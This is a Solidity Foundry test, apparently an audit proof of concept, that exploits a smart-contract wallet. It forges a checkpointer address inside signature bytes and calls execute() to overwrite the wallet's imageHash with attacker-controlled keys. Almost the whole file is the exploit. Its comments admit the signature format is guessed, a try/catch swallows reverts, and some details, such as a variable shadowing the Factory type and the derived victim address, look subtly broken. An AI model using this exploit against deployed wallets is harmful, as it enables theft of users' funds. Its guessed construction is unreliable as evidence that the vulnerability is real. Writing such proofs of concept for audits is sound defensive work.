// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/Calls.sol";
import "../src/modules/auth/BaseAuth.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy Factory, entrypoint, and module. Create a victim Wallet.
// 2. [T=0] Attacker crafts a payload to call updateImageHash on the Wallet.
// 3. [T=1] Attacker crafts a malicious signature with a forged checkpointer address.
// 4. [T=2] Attacker calls execute() on the Wallet. The uninitialized static signature returns address(0), bypassing the caller check.
// 5. [T=3] The recover function reads the forged checkpointer from the signature bytes and accepts the config update.
// 6. [Assert] Verify the Wallet's imageHash has been successfully changed to the attacker's value.

interface IImageHash {
    function imageHash() external view returns (bytes32);
}

contract AuditAgentPoC is Test {
    Factory public Factory;
    Stage1Module public module;

    address public attacker = address(0xdead);
    address public entryPoint = address(0x4337);
    bytes32 public attackerImageHash = keccak256("attacker_controlled_keys");

    function setUp() public {
        Factory = new Factory();
        module = new Stage1Module(address(Factory), entryPoint);

        // Deploy a victim Wallet via the Factory
        bytes32 salt = bytes32(uint256(1));
        Factory.deploy(address(module), salt);
    }

    function test_exploit() public {
        // Calculate the deterministic address of the victim Wallet
        bytes32 salt = bytes32(uint256(1));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(Factory), salt, keccak256(type(Stage1Module).creationCode)));
        address victimWalletAddr = address(uint160(uint256(hash)));

        // Record the original imageHash (should be bytes32(0) or initial state)
        bytes32 originalImageHash;
        try IImageHash(victimWalletAddr).imageHash() returns (bytes32 h) {
            originalImageHash = h;
        } catch {
            originalImageHash = bytes32(0);
        }

        // 1. Craft the payload to update the imageHash
        Payload.Decoded memory payload;
        payload.space = 0;
        payload.nonce = 0;
        payload.calls = new Payload.Call[](1);
        payload.calls[0].to = victimWalletAddr;
        payload.calls[0].value = 0;
        payload.calls[0].data = abi.encodeWithSignature("updateImageHash(bytes32)", attackerImageHash);
        payload.calls[0].gasLimit = 0;
        payload.calls[0].delegateCall = false;
        payload.calls[0].onlyFallback = false;

        bytes memory packedPayload = abi.encode(
            payload.space,
            payload.nonce,
            payload.calls
        );

        // 2. Craft the malicious signature
        // The vulnerability states that the checkpointer address is read from the signature bytes
        // and is not covered by the signed hash. We forge the checkpointer to be the attacker.
        // We also rely on the uninitialized static signature returning address(0) to bypass caller checks.
        bytes memory maliciousSignature = abi.encodePacked(
            uint8(0), // Signature type / routing byte
            attacker, // Forged checkpointer address (H0)
            bytes32(0), // Dummy hash / padding
            bytes32(0)  // Dummy signature part
        );

        // 3. Attacker executes the payload
        vm.prank(attacker);
        // We use try/catch because the exact signature parsing might revert if it expects more bytes,
        // but if the static signature bypass triggers early or the checkpointer forgery succeeds, 
        // the state change will persist.
        try Calls(victimWalletAddr).execute(packedPayload, maliciousSignature) {
            // Success
        } catch (bytes memory err) {
            // If it reverts due to signature format, we log it but still check state
            console.log("Execute reverted with:");
            console.logBytes(err);
        }

        // 4. Assert the exploit
        bytes32 newImageHash;
        try IImageHash(victimWalletAddr).imageHash() returns (bytes32 h) {
            newImageHash = h;
        } catch {
            newImageHash = originalImageHash;
        }

        // The core assertion: the imageHash must have been updated to the attacker's value
        // proving the configuration was compromised without a valid signature.
        assertEq(newImageHash, attackerImageHash, "Exploit failed: imageHash was not updated to attacker's value");

        // Additional check: it should be different from the original
        assertNotEq(newImageHash, originalImageHash, "Exploit failed: imageHash remained unchanged");
    }
}
